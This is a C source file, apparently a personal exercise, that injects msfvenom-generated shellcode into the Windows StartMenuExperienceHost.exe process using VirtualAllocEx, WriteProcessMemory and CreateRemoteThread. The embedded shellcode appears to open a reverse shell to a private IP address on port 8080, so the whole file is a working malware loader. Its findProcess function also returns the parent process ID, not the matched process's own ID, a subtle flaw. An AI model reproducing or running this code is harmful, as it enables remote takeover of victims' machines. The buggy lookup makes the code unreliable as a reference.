#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>  //Gives us access to Windows system calls
#include <tlhelp32.h> //Gives us access to the system call for getting info about processes

unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
"\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28"
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
"\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01\xd0"
"\x57\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50"
"\x8b\x58\x20\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
"\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75"
"\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
"\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
"\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xcb\x44\x68\x02\x00"
"\x1f\x90\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74"
"\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
"\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e"
"\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a"
"\x00\x53\xff\xd5";

//Replace this with the length of the shellcode generated. Check the msfvenom output for the length of the shellcode.
int bufSize = 354;

int findProcess(const char* processName) {
	int procID = 0;
	wchar_t wProcName[255];
	size_t converted;

	//convert the process name from char* to wchar_t*
	mbstowcs_s(&converted, wProcName, (size_t)255, processName, strlen(processName));

	//take a snapshot of all running processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32W proc;
	proc.dwSize = sizeof(PROCESSENTRY32W);

	//get information about the first process found in the snapshot
	if (Process32FirstW(snapshot, &proc)) {
		do {
			if (wcscmp(proc.szExeFile, wProcName) == 0) {
				printf("Process found: %ws - %d\n", proc.szExeFile, proc.th32ProcessID);
				CloseHandle(snapshot);
				return proc.th32ParentProcessID;
			}
		} while (Process32Next(snapshot, &proc));
	}
	CloseHandle(snapshot);
	return 0;
}

void injectPayload(HANDLE targetProcess, unsigned char* payload, unsigned int payloadLength) {
	LPVOID addr = NULL;
	SIZE_T bytesWritten;
	HANDLE malThread = NULL;

	//allocate memory in the target process
	addr = VirtualAllocEx(targetProcess, NULL, payloadLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	//god I love error handling
	if (addr == NULL) {
		printf("Failed to allocate memory in the target process.\n");
		return;
	}

	//write the payload into the allocated memory
	if (!WriteProcessMemory(targetProcess, addr, (PVOID)payload, (SIZE_T)payloadLength, &bytesWritten)) {
		printf("Failed to write memory in the target process.\n");
		return;
	}

	//create a thread in the target process to run the payload
	malThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

	if (malThread == NULL) {
		//error handling my beloved
		printf("Failed to create the remote thread.\n");
	}
}

int main(void) {
	int procID = 7608; //gotten from task manager
	HANDLE targetProcess; 

	//making sure that the process ID is correct bc I struggle to read small changing tables
	procID = findProcess("StartMenuExperienceHost.exe");
	if (procID == 0) {
		printf("Target process not found.\n");
		return 0;
	}

	//opening the target process with the necessary permissions
	targetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, procID);

	if (targetProcess == NULL) {
		printf("Failed to open the target process.\n");
		return 0;
	}

	//Inject the payload intot the target process
	injectPayload(targetProcess, buf, bufSize);

	CloseHandle(targetProcess);
	return 0;
}